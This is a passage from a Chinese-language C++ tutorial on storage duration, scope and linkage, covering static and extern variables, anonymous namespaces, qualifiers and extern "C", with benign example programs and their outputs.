函数原型参数列表中的标识符仅在原型声明内部可见。</li><li>  <strong>文件作用域 (File Scope) / 全局作用域 (Global Scope) / 名称空间作用域 (Namespace Scope):</strong> 在所有函数或类外部定义的标识符具有文件作用域（或更准确地说是名称空间作用域，全局作用域是默认的全局名称空间）。它们从声明点开始到文件末尾都可见。</li><li>  <strong>类作用域 (Class Scope):</strong> 类成员（数据成员和成员函数）具有类作用域，在类定义内部以及通过对象、引用或指针访问时可见。</li></ul><p><strong>链接性 (Linkage)</strong> 描述了名称如何在不同的编译单元（<code>.cpp</code> 文件）之间共享。</p><ul><li>  <strong>无链接性 (No Linkage):</strong> 名称只在定义它的作用域内有效，不能被其他作用域或编译单元访问。具有块作用域的变量（包括函数内部的 <code>static</code> 变量）通常没有链接性。</li><li>  <strong>内部链接性 (Internal Linkage):</strong> 名称可以在定义它的<strong>单个编译单元</strong>内的所有作用域中共享，但不能被其他编译单元访问。在文件作用域（全局或命名空间）使用 <code>static</code> 关键字声明的变量和函数，以及匿名命名空间中的实体具有内部链接性。</li><li>  <strong>外部链接性 (External Linkage):</strong> 名称可以在<strong>多个编译单元</strong>之间共享。在文件作用域（全局或命名空间）声明的非 <code>static</code> 函数、非 <code>static</code> 非 <code>const</code> 全局变量、<code>extern const</code> 全局变量以及类等具有外部链接性。</li></ul><h3 id="9-2-2-自动存储持续性"><a href="#9-2-2-自动存储持续性" class="headerlink" title="9.2.2 自动存储持续性"></a>9.2.2 自动存储持续性</h3><p>这是最常见的存储方式，适用于函数内部定义的局部变量（未使用 <code>static</code>、<code>extern</code> 或 <code>thread_local</code>）。</p><ul><li>  <strong>存储持续性:</strong> 自动。进入代码块时创建，退出时销毁。</li><li>  <strong>作用域:</strong> 块作用域。</li><li>  <strong>链接性:</strong> 无链接性。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> auto_var = <span class="number">10</span>; <span class="comment">// 自动变量</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside my_func: auto_var = &quot;</span> &lt;&lt; auto_var &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    auto_var++; <span class="comment">// 修改只在本次调用有效</span></span><br><span class="line">&#125; <span class="comment">// auto_var 在这里被销毁</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> main_var = <span class="number">5</span>; <span class="comment">// main 函数的自动变量</span></span><br><span class="line">    <span class="keyword">if</span> (main_var &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">double</span> block_var = <span class="number">3.14</span>; <span class="comment">// 块作用域的自动变量</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside if block: block_var = &quot;</span> &lt;&lt; block_var &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="comment">// block_var 在这里被销毁</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; block_var; // 错误！block_var 在此作用域不可见</span></span><br><span class="line"></span><br><span class="line">    my_func(); <span class="comment">// 调用 my_func，创建并销毁其 auto_var</span></span><br><span class="line">    my_func(); <span class="comment">// 再次调用，创建新的 auto_var，其值仍是 10</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-2-3-静态持续变量"><a href="#9-2-3-静态持续变量" class="headerlink" title="9.2.3 静态持续变量"></a>9.2.3 静态持续变量</h3><p>静态持续变量在程序整个运行期间都存在。根据链接性不同，它们有不同的用途和可见性。</p><h3 id="9-2-4-静态持续性、外部链接性"><a href="#9-2-4-静态持续性、外部链接性" class="headerlink" title="9.2.4 静态持续性、外部链接性"></a>9.2.4 静态持续性、外部链接性</h3><p>这些变量（有时称为全局变量）可以在程序的多个文件中共享。</p><ul><li>  <strong>定义:</strong> 在所有函数外部定义，且未使用 <code>static</code> 关键字。</li><li>  <strong>存储持续性:</strong> 静态。</li><li>  <strong>作用域:</strong> 文件作用域（从定义点到文件尾）。</li><li>  <strong>链接性:</strong> 外部链接性。</li><li>  <strong>初始化:</strong> 如果未显式初始化，会被自动初始化为零（或对应类型的零值）。</li><li>  <strong>共享:</strong> 要在其他文件中使用，需要使用 <code>extern</code> 关键字进行<strong>声明</strong>（不是定义）。</li></ul><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file1.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义具有外部链接性的全局变量</span></span><br><span class="line"><span class="keyword">double</span> global_data = <span class="number">3.14</span>; <span class="comment">// 显式初始化</span></span><br><span class="line"><span class="keyword">int</span> count; <span class="comment">// 隐式初始化为 0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">increment_count</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_data</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;In file1: global_data = &quot;</span> &lt;&lt; global_data &lt;&lt; <span class="string">&quot;, count = &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file2.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明 file1 中定义的全局变量 (使用 extern)</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">double</span> global_data;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> count;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明 file1 中定义的函数 (函数声明默认 extern)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">increment_count</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_data</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">use_globals</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;In file2 (before increment): global_data = &quot;</span> &lt;&lt; global_data &lt;&lt; <span class="string">&quot;, count = &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    increment_count(); <span class="comment">// 调用 file1 中的函数，修改 file1 中的 count</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;In file2 (after increment): global_data = &quot;</span> &lt;&lt; global_data &lt;&lt; <span class="string">&quot;, count = &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    display_data(); <span class="comment">// 调用 file1 的函数</span></span><br><span class="line">    use_globals();  <span class="comment">// 调用 file2 的函数</span></span><br><span class="line">    display_data(); <span class="comment">// 再次调用 file1 的函数，查看 count 的变化</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编译和链接:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ file1.cpp file2.cpp -o myprogram</span><br><span class="line">./myprogram</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In file1: global_data &#x3D; 3.14, count &#x3D; 0</span><br><span class="line">In file2 (before increment): global_data &#x3D; 3.14, count &#x3D; 0</span><br><span class="line">In file2 (after increment): global_data &#x3D; 3.14, count &#x3D; 1</span><br><span class="line">In file1: global_data &#x3D; 3.14, count &#x3D; 1</span><br></pre></td></tr></table></figure><p><strong>注意:</strong> 过度使用具有外部链接性的全局变量会增加模块间的耦合度，使程序难以理解和维护，应尽量避免。</p><h3 id="9-2-5-静态持续性、内部链接性"><a href="#9-2-5-静态持续性、内部链接性" class="headerlink" title="9.2.5 静态持续性、内部链接性"></a>9.2.5 静态持续性、内部链接性</h3><p>这些变量和函数的作用域限制在单个编译单元（<code>.cpp</code> 文件）内，有助于避免不同文件间的命名冲突。</p><ul><li>  <strong>定义:</strong> 在所有函数外部定义，并使用 <code>static</code> 关键字。或者定义在匿名命名空间中。</li><li>  <strong>存储持续性:</strong> 静态。</li><li>  <strong>作用域:</strong> 文件作用域。</li><li>  <strong>链接性:</strong> 内部链接性。</li><li>  <strong>初始化:</strong> 同外部链接性变量，默认为零值。</li><li>  <strong>共享:</strong> 不能被其他编译单元通过 <code>extern</code> 访问。</li></ul><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// service.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 具有内部链接性的静态全局变量</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> service_counter = <span class="number">0</span>; <span class="comment">// 只在 service.cpp 可见</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 具有内部链接性的静态函数</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">internal_helper</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Internal helper called.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">provide_service</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    internal_helper();</span><br><span class="line">    service_counter++;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Service provided. Counter: &quot;</span> &lt;&lt; service_counter &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明 service.cpp 中的函数 (具有外部链接性)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">provide_service</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// extern int service_counter; // 错误！无法访问内部链接性的变量</span></span><br><span class="line"><span class="comment">// static void internal_helper(); // 错误！无法访问内部链接性的函数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    provide_service();</span><br><span class="line">    provide_service();</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; service_counter; // 错误！</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编译和链接:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ service.cpp main.cpp -o myapp</span><br><span class="line">./myapp</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Internal helper called.</span><br><span class="line">Service provided. Counter: 1</span><br><span class="line">Internal helper called.</span><br><span class="line">Service provided. Counter: 2</span><br></pre></td></tr></table></figure><p><strong>匿名命名空间 (Unnamed/Anonymous Namespace):</strong></p><p>C++ 提供匿名命名空间作为 <code>static</code> 用于内部链接性的更好替代方案。在匿名命名空间中声明的所有内容都具有内部链接性。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// service_v2.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123; <span class="comment">// 匿名命名空间</span></span><br><span class="line">    <span class="keyword">int</span> service_counter_v2 = <span class="number">0</span>; <span class="comment">// 内部链接性</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">internal_helper_v2</span><span class="params">()</span> </span>&#123; <span class="comment">// 内部链接性</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Internal helper v2 called.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="comment">// end anonymous namespace</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">provide_service_v2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    internal_helper_v2();</span><br><span class="line">    service_counter_v2++;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Service v2 provided. Counter: &quot;</span> &lt;&lt; service_counter_v2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-2-6-静态存储持续性、无链接性"><a href="#9-2-6-静态存储持续性、无链接性" class="headerlink" title="9.2.6 静态存储持续性、无链接性"></a>9.2.6 静态存储持续性、无链接性</h3><p>这种变量在函数内部声明，但使用 <code>static</code> 关键字。</p><ul><li>  <strong>定义:</strong> 在代码块（通常是函数）内部，使用 <code>static</code> 关键字。</li><li>  <strong>存储持续性:</strong> 静态。它们在程序启动时或第一次执行到其定义时创建，并在整个程序生命周期内存在。</li><li>  <strong>作用域:</strong> 块作用域。它们只能在定义它们的代码块内部按名称访问。</li><li>  <strong>链接性:</strong> 无链接性。</li><li>  <strong>初始化:</strong> 只在程序执行第一次到达其定义时初始化一次。如果未显式初始化，默认为零值。</li><li>  <strong>特性:</strong> 它们在函数调用之间保持其值。</li></ul><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">record_call</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> call_count = <span class="number">0</span>; <span class="comment">// 静态局部变量，只初始化一次</span></span><br><span class="line">    call_count++;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Function record_call has been called &quot;</span> &lt;&lt; call_count &lt;&lt; <span class="string">&quot; times.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    record_call();</span><br><span class="line">    record_call();</span><br><span class="line">    record_call();</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; call_count; // 错误！call_count 在 main 中不可见</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Function record_call has been called 1 times.</span><br><span class="line">Function record_call has been called 2 times.</span><br><span class="line">Function record_call has been called 3 times.</span><br></pre></td></tr></table></figure><h3 id="9-2-7-说明符和限定符"><a href="#9-2-7-说明符和限定符" class="headerlink" title="9.2.7 说明符和限定符"></a>9.2.7 说明符和限定符</h3><p>C++ 提供了一些关键字来修改变量或函数的存储持续性、链接性或行为：</p><ul><li><strong><code>static</code></strong>:<ul><li>  用于文件作用域：指定<strong>内部链接性</strong>。</li><li>  用于块作用域：指定<strong>静态存储持续性</strong>（和无链接性）。</li><li>  用于类成员：表示成员属于类本身，而不是类的特定对象（将在类章节详细介绍）。</li></ul></li><li><strong><code>extern</code></strong>:<ul><li>  用于变量：声明一个在别处（通常是另一个文件）定义的具有<strong>外部链接性</strong>的变量。它不创建变量，只是告诉编译器该变量存在。</li><li>  <code>extern &quot;C&quot;</code>: 指定<strong>语言链接性</strong>（见 9.2.9）。</li></ul></li><li><strong><code>const</code></strong>:<ul><li>  限定符，表示变量的值不能被修改。</li><li><code>const</code> 全局变量默认具有<strong>内部链接性</strong>。要使其具有外部链接性，必须使用 <code>extern const</code> 声明，并在定义时也加上 <code>extern</code>。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// header.h</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">const</span> <span class="keyword">int</span> MAX_USERS; <span class="comment">// 声明外部链接的 const</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// config.cpp</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">const</span> <span class="keyword">int</span> MAX_USERS = <span class="number">100</span>; <span class="comment">// 定义外部链接的 const</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// utils.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;header.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_users</span><span class="params">()</span> </span>&#123; <span class="keyword">if</span> (user_count &gt; MAX_USERS) &#123; <span class="comment">/*...*/</span> &#125; &#125;</span><br></pre></td></tr></table></figure>  或者，更常见的做法是将 <code>const</code> 定义在头文件中（因为它默认内部链接，不会引起重定义问题），或者使用 C++11 的 <code>constexpr</code>。</li></ul></li><li><strong><code>thread_local</code> (C++11)</strong>:<ul><li>  指定<strong>线程存储持续性</strong>。每个线程将拥有该变量的独立副本。</li></ul></li><li><strong><code>volatile</code></strong>:<ul><li>  限定符，告诉编译器变量的值可能在程序代码未显式修改的情况下发生改变（例如，由硬件或其他并发线程修改）。编译器不会对 <code>volatile</code> 变量进行某些优化（如缓存到寄存器）。</li></ul></li><li><strong><code>mutable</code></strong>:<ul><li>  限定符，仅用于类的数据成员。允许在 <code>const</code> 成员函数中修改被 <code>mutable</code> 修饰的成员变量。</li></ul></li></ul><h3 id="9-2-8-函数和链接性"><a href="#9-2-8-函数和链接性" class="headerlink" title="9.2.8 函数和链接性"></a>9.2.8 函数和链接性</h3><p>函数默认具有<strong>外部链接性</strong>，这意味着在一个文件中定义的函数可以在其他文件中声明和调用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// math_utils.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">square</span><span class="params">(<span class="keyword">double</span> x)</span> </span>&#123; <span class="keyword">return</span> x * x; &#125; <span class="comment">// 外部链接性 (默认)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">square</span><span class="params">(<span class="keyword">double</span> x)</span></span>; <span class="comment">// 声明 (默认 extern)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; square(<span class="number">5.0</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure><p>可以使用 <code>static</code> 关键字将函数的链接性改为<strong>内部链接性</strong>，使其仅在定义的 <code>.cpp</code> 文件内可见。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// helper.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">internal_print</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span> </span>&#123; <span class="comment">// 内部链接性</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[Internal] &quot;</span> &lt;&lt; msg &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">public_helper</span><span class="params">()</span> </span>&#123; internal_print(<span class="string">&quot;Public helper called&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">public_helper</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">// static void internal_print(const char*); // 错误！无法访问</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; public_helper(); <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure><h3 id="9-2-9-语言链接性"><a href="#9-2-9-语言链接性" class="headerlink" title="9.2.9 语言链接性"></a>9.2.9 语言链接性</h3><p>C++ 程序有时需要调用用其他语言（主要是 C 语言）编写的函数。由于 C++ 支持函数重载（通过名称修饰），而 C 语言不支持，直接链接可能会失败。<strong>语言链接性 (Language Linkage)</strong> 机制允许指定函数应遵循哪种语言的链接约定。</p><p>最常用的是 <code>extern &quot;C&quot;</code>，它指示编译器使用 C 语言的链接约定（通常只是函数名本身，没有修饰）。</p><p><strong>用法:</strong></p><ul><li><strong>单个函数:</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="keyword">void</span> <span class="title">c_style_function</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br></pre></td></tr></table></figure></li><li><strong>多个函数块:</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; // 包含 C 头文件</span></span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">c_function1</span><span class="params">(<span class="keyword">double</span>)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">c_function2</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>*)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>当在 C++ 代码中包含 C 语言的头文件时，这些头文件通常已经使用了 <code>extern &quot;C&quot;</code>（通过条件编译 <code>__cplusplus</code> 宏）来确保 C++ 编译器能正确链接其中的函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C 头文件 my_c_lib.h 可能包含类似结构</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">c_api_call</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="comment">// ... 其他 C 函数声明 ...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125; <span class="comment">// extern &quot;C&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="9-2-10-存储方案和动态分配"><a href="#9-2-10-存储方案和动态分配" class="headerlink" title="9.2.10 存储方案和动态分配"></a>9.2.10 存储方案和动态分配</h3><p>总结一下主要的存储方案：</p><ol><li> <strong>自动存储:</strong> 栈内存，生命周期与代码块绑定，自动管理。</li><li> <strong>静态存储:</strong> 程序生命周期内存在，根据链接性（外部、内部、无）决定可见性。</li><li> <strong>线程存储:</strong> 生命周期与线程绑定。</li><li> <strong>动态存储:</strong> 堆内存（自由存储区），生命周期由 <code>new</code> 和 <code>delete</code> 手动管理。</li></ol><p>动态分配 (<code>new</code>/<code>delete</code>) 